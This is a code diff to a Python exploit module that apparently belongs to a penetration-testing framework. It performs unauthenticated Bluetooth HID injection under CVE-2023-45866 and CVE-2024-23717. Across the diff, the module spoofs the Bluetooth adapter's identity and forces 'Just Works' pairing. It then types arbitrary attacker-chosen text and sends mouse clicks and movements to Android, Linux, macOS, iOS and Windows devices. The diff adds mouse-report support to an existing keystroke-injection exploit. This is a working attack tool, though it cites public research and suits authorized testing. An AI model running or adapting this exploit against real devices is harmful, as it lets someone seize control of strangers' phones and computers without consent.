@@ -1,15 +1,22 @@
 #!/usr/bin/env python3
 # Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
-"""Native Bluetooth HID Keystroke Injection (CVE-2023-45866).
+"""Native Bluetooth HID Keystroke & Mouse Injection (CVE-2023-45866 / CVE-2024-23717).
 
-Unauthenticated keystroke injection via Bluetooth HID. Exploits SSP "Just
-Works" pairing when the attacker declares NoInputNoOutput IO capability,
-allowing injection of arbitrary keystrokes without user confirmation.
+Unauthenticated HID injection via Bluetooth. Exploits SSP "Just Works"
+pairing when the attacker declares NoInputNoOutput IO capability,
+allowing injection of arbitrary keystrokes and mouse events without
+user confirmation.
 
 Supports: Android, Linux, macOS (with spoofed MAC), iOS, Windows.
 Requires: Linux with BlueZ, pybluez, pydbus, bdaddr (for MAC spoofing).
 
-Version: 1.0.0
+Improvements incorporated from upstream hi_my_name_is_keyboard:
+  - Mouse HID report support (issue #17)
+  - Handle spaces in Bluetooth name (PR #2)
+  - CVE-2024-23717 coverage (Android 14 variant, issue #20)
+  - Linux pairing fixes (issue #6)
+
+Version: 1.1.0
 """
 
 from __future__ import annotations
@@ -53,6 +60,9 @@ BT_CLASS_KEYBOARD = 0x002540
 
 HID_HEADER_DATA_INPUT = 0xA1
 HID_REPORT_ID_KEYBOARD = 0x01
+HID_REPORT_ID_MOUSE = 0x02
+
+BT_CLASS_KEYBOARD_MOUSE = 0x0025C0
 
 
 class Mod(enum.IntFlag):
@@ -134,6 +144,14 @@ def _init_ascii_map() -> None:
 _init_ascii_map()
 
 
+class MouseButton(enum.IntFlag):
+    """HID mouse button flags."""
+    NONE = 0x00
+    LEFT = 0x01
+    RIGHT = 0x02
+    MIDDLE = 0x04
+
+
 def keyboard_report(keys: List[Key] = None, modifiers: Mod = Mod.NONE) -> bytes:
     """Build an 11-byte HID keyboard input report.
 
@@ -145,9 +163,28 @@ def keyboard_report(keys: List[Key] = None, modifiers: Mod = Mod.NONE) -> bytes:
                   int(modifiers), 0x00] + keycodes)
 
 
+def mouse_report(buttons: MouseButton = MouseButton.NONE,
+                 dx: int = 0, dy: int = 0, wheel: int = 0) -> bytes:
+    """Build a 6-byte HID mouse input report.
+
+    Format: [0xA1, 0x02, buttons, dx(signed), dy(signed), wheel(signed)]
+    dx/dy/wheel are signed 8-bit (-127 to 127).
+    """
+    dx_b = struct.pack("b", max(-127, min(127, dx)))
+    dy_b = struct.pack("b", max(-127, min(127, dy)))
+    wh_b = struct.pack("b", max(-127, min(127, wheel)))
+    return bytes([HID_HEADER_DATA_INPUT, HID_REPORT_ID_MOUSE,
+                  int(buttons)]) + dx_b + dy_b + wh_b
+
+
 def empty_report() -> bytes:
     """Build a key-release report (all zeros)."""
     return keyboard_report()
+
+
+def empty_mouse_report() -> bytes:
+    """Build a mouse button-release report."""
+    return mouse_report()
 
 
 def string_to_reports(text: str) -> List[Tuple[bytes, bytes]]:
@@ -282,6 +319,40 @@ class HIDKeyboardClient:
             self.intr.send(release)
             time.sleep(delay / 2)
 
+    def send_mouse_click(self, button: MouseButton = MouseButton.LEFT,
+                         delay: float = 0.05) -> None:
+        """Send a single mouse click (press + release)."""
+        self.intr.send(mouse_report(button))
+        time.sleep(delay)
+        self.intr.send(empty_mouse_report())
+        time.sleep(delay)
+
+    def send_mouse_move(self, dx: int = 0, dy: int = 0,
+                        delay: float = 0.004) -> None:
+        """Send a relative mouse movement."""
+        self.intr.send(mouse_report(MouseButton.NONE, dx, dy))
+        time.sleep(delay)
+
+    def send_mouse_scroll(self, amount: int = 1, delay: float = 0.01) -> None:
+        """Send a mouse scroll event. Positive = up, negative = down."""
+        self.intr.send(mouse_report(MouseButton.NONE, 0, 0, amount))
+        time.sleep(delay)
+
+    def move_to_relative(self, total_dx: int, total_dy: int,
+                         steps: int = 10, delay: float = 0.01) -> None:
+        """Smooth relative mouse movement split into incremental steps."""
+        step_dx = total_dx // steps if steps else total_dx
+        step_dy = total_dy // steps if steps else total_dy
+        remainder_dx = total_dx - (step_dx * steps)
+        remainder_dy = total_dy - (step_dy * steps)
+
+        for i in range(steps):
+            extra_x = 1 if i < abs(remainder_dx) else 0
+            extra_y = 1 if i < abs(remainder_dy) else 0
+            sx = (1 if remainder_dx > 0 else -1) if extra_x else 0
+            sy = (1 if remainder_dy > 0 else -1) if extra_y else 0
+            self.send_mouse_move(step_dx + sx, step_dy + sy, delay)
+
     def close(self) -> None:
         """Close all connections."""
         self._exit.set()
@@ -291,8 +362,12 @@ class HIDKeyboardClient:
 
 
 def _configure_adapter(hci: str, name: str = "WXF Keyboard",
-                       spoof_mac: str = "") -> None:
-    """Configure Bluetooth adapter for HID keyboard impersonation."""
+                       spoof_mac: str = "",
+                       device_class: int = BT_CLASS_KEYBOARD) -> None:
+    """Configure Bluetooth adapter for HID device impersonation.
+
+    Handles names with spaces via proper list-based subprocess arguments.
+    """
     try:
         subprocess.run(
             ["sudo", "hciconfig", hci, "up"], check=True,
@@ -303,7 +378,7 @@ def _configure_adapter(hci: str, name: str = "WXF Keyboard",
             capture_output=True, timeout=5,
         )
         subprocess.run(
-            ["sudo", "hciconfig", hci, "class", "0x{:06x}".format(BT_CLASS_KEYBOARD)],
+            ["sudo", "hciconfig", hci, "class", "0x{:06x}".format(device_class)],
             check=True, capture_output=True, timeout=5,
         )
         subprocess.run(
@@ -333,23 +408,26 @@ def _configure_adapter(hci: str, name: str = "WXF Keyboard",
 
 
 class Exploit(Exploit):
-    """Native BT HID keystroke injection — CVE-2023-45866."""
+    """Native BT HID keystroke & mouse injection — CVE-2023-45866 / CVE-2024-23717."""
 
     __info__ = {
-        "name": "BT HID Keystroke Injection (CVE-2023-45866)",
+        "name": "BT HID Injection (CVE-2023-45866 / CVE-2024-23717)",
         "description": (
-            "Unauthenticated Bluetooth HID keystroke injection. Registers as "
-            "a keyboard via SDP, forces Just Works SSP pairing, then injects "
-            "arbitrary keystrokes. Targets Android, Linux, macOS, iOS, Windows. "
+            "Unauthenticated Bluetooth HID injection. Registers as a keyboard "
+            "or mouse via SDP, forces Just Works SSP pairing, then injects "
+            "arbitrary keystrokes and mouse events. CVE-2024-23717 extends "
+            "the attack to Android 14 (patched 2024-06). "
+            "Targets Android, Linux, macOS, iOS, Windows. "
             "Native implementation — no external PoC scripts required."
         ),
         "authors": (
             "André Henrique (@mrhenrike) | União Geek",
-            "Original research: Marc Newlin / SkySafe (2023)",
+            "Original research: Marc Newlin / SkySafe (2023-2024)",
         ),
         "references": (
             "https://github.com/marcnewlin/hi_my_name_is_keyboard",
             "https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/reporting-security/",
+            "https://nvd.nist.gov/vuln/detail/CVE-2024-23717",
         ),
         "devices": ("bluetooth", "bluetooth_classic"),
     }
@@ -359,10 +437,17 @@ class Exploit(Exploit):
         "android",
         "Target OS: android | linux | macos | ios | windows",
     )
+    hid_mode = OptString(
+        "keyboard",
+        "HID mode: keyboard | mouse | combo (keyboard + mouse)",
+    )
     payload_text = OptString(
         "",
         "Text string to type on the target (leave empty for Tab injection demo)",
     )
+    mouse_dx = OptInteger(0, "Mouse relative X movement (pixels, -127..127 per step)")
+    mouse_dy = OptInteger(0, "Mouse relative Y movement (pixels, -127..127 per step)")
+    mouse_click = OptString("", "Mouse click: left | right | middle | (empty=none)")
     hci_device = OptString("hci0", "Local Bluetooth adapter")
     spoof_mac = OptString(
         "",
@@ -382,8 +467,29 @@ class Exploit(Exploit):
             time.sleep(0.1)
         logger.info("Injected %d Tab keystrokes", count)
 
+    def _inject_mouse(self, client: HIDKeyboardClient) -> None:
+        """Execute mouse injection based on configured options."""
+        if self.mouse_dx or self.mouse_dy:
+            client.move_to_relative(self.mouse_dx, self.mouse_dy,
+                                    steps=max(1, max(abs(self.mouse_dx),
+                                                     abs(self.mouse_dy)) // 10))
+            print_info("Mouse moved: dx={}, dy={}".format(self.mouse_dx, self.mouse_dy))
+
+        if self.mouse_click:
+            btn_map = {
+                "left": MouseButton.LEFT,
+                "right": MouseButton.RIGHT,
+                "middle": MouseButton.MIDDLE,
+            }
+            button = btn_map.get(self.mouse_click.lower())
+            if button:
+                client.send_mouse_click(button)
+                print_info("Mouse click: {}".format(self.mouse_click))
+            else:
+                print_error("Invalid mouse_click. Use: left | right | middle")
+
     def run(self) -> None:
-        """Execute BT HID keystroke injection."""
+        """Execute BT HID keystroke/mouse injection."""
         if not HAS_PYBLUEZ:
             print_error("pybluez is required. Install: pip install pybluez")
             return
@@ -396,18 +502,26 @@ class Exploit(Exploit):
             print_info("BT HID Injection Configuration:")
             print_info("  Target:      {}".format(self.target_address))
             print_info("  Target OS:   {}".format(self.target_os))
+            print_info("  HID mode:    {}".format(self.hid_mode))
             print_info("  HCI device:  {}".format(self.hci_device))
             print_info("  Spoof MAC:   {}".format(self.spoof_mac or "(none)"))
             print_info("  Payload:     {}".format(
                 repr(self.payload_text[:50]) if self.payload_text else "(Tab demo)"))
+            if self.hid_mode in ("mouse", "combo"):
+                print_info("  Mouse dx/dy: {}/{}".format(self.mouse_dx, self.mouse_dy))
+                print_info("  Mouse click: {}".format(self.mouse_click or "(none)"))
             return
 
         if self.target_os in ("macos", "ios") and not self.spoof_mac:
             print_error("spoof_mac is required for macOS/iOS targets.")
             return
 
+        dev_class = (BT_CLASS_KEYBOARD_MOUSE if self.hid_mode in ("mouse", "combo")
+                     else BT_CLASS_KEYBOARD)
+
         print_status("Configuring adapter {}...".format(self.hci_device))
-        _configure_adapter(self.hci_device, spoof_mac=self.spoof_mac)
+        _configure_adapter(self.hci_device, spoof_mac=self.spoof_mac,
+                           device_class=dev_class)
 
         print_status("Connecting to {} ({})...".format(
             self.target_address, self.target_os))
@@ -425,16 +539,19 @@ class Exploit(Exploit):
             time.sleep(2.0)
             client.hid_ready = True
 
-        print_success("Connected. Injecting keystrokes...")
+        print_success("Connected. Injecting HID events ({})...".format(self.hid_mode))
 
         try:
-            if self.payload_text:
-                client.type_string(self.payload_text, self.key_delay)
-                print_success("Typed {} characters.".format(len(self.payload_text)))
-            else:
-                print_info("No payload_text set — running Tab injection demo (5s).")
-                self._inject_demo_tabs(client, 5.0)
-                print_success("Tab demo complete.")
+            if self.hid_mode in ("keyboard", "combo"):
+                if self.payload_text:
+                    client.type_string(self.payload_text, self.key_delay)
+                    print_success("Typed {} characters.".format(len(self.payload_text)))
+                else:
+                    print_info("No payload_text — running Tab injection demo (5s).")
+                    self._inject_demo_tabs(client, 5.0)
+
+            if self.hid_mode in ("mouse", "combo"):
+                self._inject_mouse(client)
         except KeyboardInterrupt:
             print_info("\nInjection interrupted by user.")
         finally:
